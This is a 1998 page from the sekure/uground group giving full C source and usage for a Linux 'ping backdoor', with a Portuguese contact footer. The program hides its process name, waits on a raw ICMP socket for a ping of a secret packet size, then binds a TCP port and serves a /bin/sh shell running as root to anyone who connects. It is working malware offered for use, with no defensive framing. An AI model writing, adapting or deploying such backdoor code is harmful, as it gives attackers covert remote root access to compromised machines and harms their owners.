

                        sekure/uground industries
                           papers and resources

          ........................................................
                              www.sekure.org


                    -> sekure ping backdoor for linux <-



/* 
 * sekure ping backdoor for linux. (Sep 13, 1998)
 *
 *
 * usage:    
 *  ./ping-back packet_size port
 *      
 *                  |         `-> port to bind the shell.
 *                  `-> you'll use this number to start the shell. 
 *  
 *  to start the shell: ping host -s packet_size
 *  
 *
 * coded by jamez. e-mail: jamez@sekure.org
 *
 * http://www.sekure.org
 *
 */



#include <signal.h>
#include <netinet/ip.h>
#include <netdb.h>


int SIZEPACK, PORT;




void child_kill() 
{
  wait(NULL);
  signal(SIGCHLD, child_kill);
}




int bind_shell() 
{
  
  int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
  struct sockaddr_in serv_addr;
  struct sockaddr_in client_addr;
 
  
 
  setuid(0);
  setgid(0);
  seteuid(0);
  setegid(0);
                  
  chdir("/"); 

  
  soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  if (soc_des == -1) 
    exit(-1);


  bzero((char *) &serv_addr,sizeof(serv_addr));
  
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
  serv_addr.sin_port = htons(PORT);
  soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));

  
  if (soc_rc != 0) 
    exit(-1);
  
  if (fork() != 0) 
    exit(0);
  
    
  setpgrp();

  
  
  if (fork() != 0)
    exit(0);
    

    
  soc_rc = listen(soc_des, 5);
  if (soc_rc != 0) 
    exit(0);

  
  while (1) 
    {
      soc_len = sizeof(client_addr);
      soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);

      if (soc_cli < 0) 
	exit(0);
      
      cli_pid = getpid();
      server_pid = fork();
      
      if (server_pid != 0) 
	{
	  dup2(soc_cli,0);
	  dup2(soc_cli,1);
	  dup2(soc_cli,2);
	  execl("/bin/sh","sh",(char *)0);
	  close(soc_cli);
	  return 1;
	}
      
      close(soc_cli);
    }
    
  
}






int main(int argc, char *argv[])
{
  
  int s, size, fromlen;
  char pkt[4096];


  struct protoent *proto;
  struct sockaddr_in from;


  if(argc < 3) {
    printf("usage: %s packet_size port (jamez@sekure.org)\n", argv[0]);
    exit(0);
  }


  SIZEPACK = atoi(argv[1]);
  PORT = atoi(argv[2]);
  
  

  
  strcpy(argv[0], (char *)strcat(argv[0], "                             "));


  signal(SIGHUP,SIG_IGN);        
  signal(SIGCHLD, child_kill);
  
  
  if (fork() != 0) exit(0);
  

  
  proto = getprotobyname("icmp");  

  if ((s = socket(AF_INET, SOCK_RAW, proto->p_proto)) < 0) 
    /* can't creat raw socket */
    exit(0);

	  

  /* waiting for packets */
  while(1)
    {
      do
	{
	  fromlen = sizeof(from);
	  if ((size = recvfrom(s, pkt, sizeof(pkt), 0, (struct sockaddr *) &from, &fromlen)) < 0)
	    printf("ping of %i\n", size-28);
	  
        } while (size != SIZEPACK + 28);
      
      
      
      
      /* size == SIZEPACK, let's bind the shell */
      switch(fork())	  {
      case -1:
	continue;	  	  
      case 0:
	/* strcpy(argv[0], "-sekure working for your profit-"); */
	bind_shell();
	exit(0);
      }
                 
      sleep(15);
      
    }
  

  
  
} 

Contatos
--------

 sekure/uground industries - Papers & Resources
 uma publicacao da sekure/uground industries (tm)
 http://www.sekure.org - contatos: security@sekure.org

 Procure pelos advisories da sekure/uground industries em http://www.sekure.org/advisories.html

 Assine a lista Best Of Security Brasil - http://www.sekure.org/bos
 Mande mensagem pra bos-br-request@sekure.org
 Ponha "subscribe bos-br" no corpo da mensagem.

---
